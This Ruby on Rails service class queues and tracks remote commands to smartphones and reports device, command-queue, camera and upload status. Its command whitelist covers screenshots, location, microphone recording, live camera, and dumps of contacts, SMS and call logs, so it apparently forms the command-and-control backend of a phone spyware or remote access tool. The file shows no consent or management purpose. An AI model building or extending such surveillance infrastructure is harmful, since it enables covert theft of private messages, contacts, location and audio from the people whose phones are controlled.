class DeviceCommandService < ApplicationService
  include CommandSender

  def initialize(smartphone = nil, command = nil, params = {})
    @smartphone = smartphone
    @command = command
    @params = params
  end

  # New call method for Result pattern
  def call
    return Result.failure("Smartphone is required") unless @smartphone
    return Result.failure("Command is required") unless @command
    
    validate_device!
    validate_command!
    
    pending_command = send_command_async(@smartphone, @command, @params)
    Result.success(pending_command)
  rescue => e
    Rails.logger.error("Command failed: #{e.message}")
    Result.failure(e.message)
  end

  # Legacy methods kept for backward compatibility
  def queue_command(command, params = {})
    raise ArgumentError, "Smartphone is required" unless @smartphone

    send_command_async(@smartphone, command, params)
  end

  def wait_for_command(command, params = {}, timeout: 30.seconds)
    raise ArgumentError, "Smartphone is required" unless @smartphone

    send_command_and_wait(@smartphone, command, params, timeout: timeout)
  end

  def self.devices_snapshot(limit: 20)
    Smartphone.includes(:pending_commands).order(updated_at: :desc).limit(limit).map do |device|
      last_command = device.pending_commands.order(created_at: :desc).first

      {
        id: device.id,
        name: device.name,
        device_id: device.device_id,
        operating_system: device.operating_system,
        status: last_command&.status || "idle",
        pending: device.pending_commands.count,
        last_command: last_command_summary(last_command),
        updated_at: device.updated_at
      }
    end
  end

  def self.command_queue(limit: 30)
    PendingCommand.order(created_at: :desc).limit(limit).map do |command|
      {
        request_id: command.request_id,
        command: command.command,
        status: command.status,
        smartphone_id: command.smartphone_id,
        device_id: command.smartphone&.device_id,
        params: command.params,
        created_at: command.created_at
      }
    end
  end

  def self.webrtc_status(limit: 5)
    PendingCommand.where(command: %w[start_camera stop_camera])
                  .order(created_at: :desc)
                  .limit(limit)
                  .map do |command|
      {
        request_id: command.request_id,
        command: command.command,
        status: command.status,
        device_id: command.smartphone&.device_id,
        issued_at: command.created_at
      }
    end
  end

  def self.upload_progress
    uploads_dir = Rails.root.join('tmp', 'uploads')
    return [] unless Dir.exist?(uploads_dir)

    Dir.glob("#{uploads_dir}/*.meta").map do |meta_path|
      metadata = JSON.parse(File.read(meta_path)) rescue {}
      total_chunks = metadata["total_chunks"].to_i
      received_chunks = Array(metadata["chunks_received"]).size
      progress = total_chunks.positive? ? ((received_chunks.to_f / total_chunks) * 100).round : 0

      {
        upload_id: metadata["upload_id"] || File.basename(meta_path, ".meta"),
        filename: metadata["filename"] || "pending-upload",
        total_chunks: total_chunks,
        received_chunks: received_chunks,
        progress: progress,
        last_updated: File.mtime(meta_path)
      }
    end
  end

  private_class_method def self.last_command_summary(command)
    return nil unless command

    {
      command: command.command,
      status: command.status,
      issued_at: command.created_at
    }
  end

  private

  attr_reader :smartphone

  def validate_device!
    raise ArgumentError, "Device not found" if @smartphone.nil?
    raise ArgumentError, "Device not connected" unless @smartphone.respond_to?(:device_id) && @smartphone.device_id.present?
  end
  
  def validate_command!
    valid_commands = %w[
      take_screenshot location mic_record camera_capture
      get_device_info start_camera stop_camera get_wifi_info
      get_localtime dump_contacts dump_sms dump_calllogs
    ]
    raise ArgumentError, "Invalid command: #{@command}" unless valid_commands.include?(@command.to_s)
  end
end
